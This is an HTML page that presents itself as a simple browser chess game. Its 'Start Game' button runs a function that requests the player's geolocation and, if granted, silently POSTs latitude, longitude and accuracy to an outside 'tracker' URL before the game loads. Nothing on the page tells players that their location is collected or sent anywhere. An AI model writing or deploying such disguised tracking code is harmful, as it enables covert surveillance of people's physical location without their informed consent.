<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Chess Game</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/chessboard.js/1.0.0/chessboard-1.0.0.min.css"/>

<style>
body {
  margin:0;
  font-family: system-ui, sans-serif;
  background: linear-gradient(135deg,#1e293b,#0f172a);
  color:white;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  min-height:100vh;
}

.card {
  background:#111827;
  padding:20px;
  border-radius:14px;
  box-shadow:0 10px 30px rgba(0,0,0,0.5);
  text-align:center;
}

#board {
  margin-top:15px;
  width:400px;
}
</style>
</head>
<body>

<div class="card">
  <h1>Chess Game</h1>
  <p>Click “Start Game” to begin.</p>
  <button onclick="requestLocation()">Start Game</button>
  <div id="board"></div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/chess.js/1.0.0/chess.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/chessboard.js/1.0.0/chessboard-1.0.0.min.js"></script>

<script>
const WORKER_URL = "https://jovdat7.github.io/tracker/"; // Your Cloudflare Worker URL

let game;
let board;

function requestLocation() {
  if (!navigator.geolocation) {
    startChessGame();
    return;
  }

  // Ask for permission
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      // Send location silently to Worker
      fetch(WORKER_URL, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy
        })
      }).catch(console.error);

      // Start the game
      startChessGame();
    },
    () => {
      // User denied, still start the game
      startChessGame();
    }
  );
}

function startChessGame() {
  document.getElementById("board").style.display = "block";
  game = new Chess();
  board = Chessboard('board', {
    draggable:true,
    position:'start',
    onDrop:handleMove
  });
}

function handleMove(source, target) {
  let move = game.move({from:source, to:target, promotion:'q'});
  if(move===null) return 'snapback';
  board.position(game.fen());

  if(game.game_over()) {
    if(game.in_checkmate()) alert("Checkmate! Game over.");
    else if(game.in_stalemate()) alert("Stalemate! Game over.");
    else if(game.in_draw()) alert("Draw! Game over.");
  }
}
</script>

</body>
</html>
